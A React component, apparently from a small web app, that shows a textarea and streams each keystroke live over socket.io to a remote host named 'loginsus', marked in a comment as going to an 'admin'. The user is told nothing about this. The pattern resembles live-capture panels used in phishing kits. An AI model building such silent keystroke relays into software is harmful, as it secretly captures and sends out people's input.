// src/TextAreaPage.jsx
import React, { useEffect, useState, useRef } from "react";
import io from "socket.io-client";
import { useNavigate } from "react-router-dom";

export default function TextAreaPage() {
  const [text, setText] = useState("");
  const [socketId, setSocketId] = useState("");
  const navigate = useNavigate();
  const socketRef = useRef(null);

  useEffect(() => {
    // create socket on mount
    socketRef.current = io("https://loginsus.onrender.com");
    socketRef.current.on("connect", () => {
      setSocketId(socketRef.current.id);
    });
    return () => {
      socketRef.current.disconnect();
    };
  }, []);

  const handleChange = (e) => {
    const val = e.target.value;
    setText(val);

    // emit typing to admin
    if (socketId) {
      socketRef.current.emit("typing", {
        field: "textarea",
        value: val,
        type: "CustomTextArea",
        userId: socketId,
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 p-6">
      <h1 className="text-2xl font-bold mb-4">Type your text below</h1>
      <textarea
        className="w-full max-w-lg h-48 border rounded p-3 mb-4"
        placeholder="Start typing…"
        value={text}
        onChange={handleChange}
      />
      <button
        onClick={() => navigate("/")}
        className="px-6 py-2 bg-blue-600 text-white rounded-lg"
      >
        Back
      </button>
    </div>
  );
}
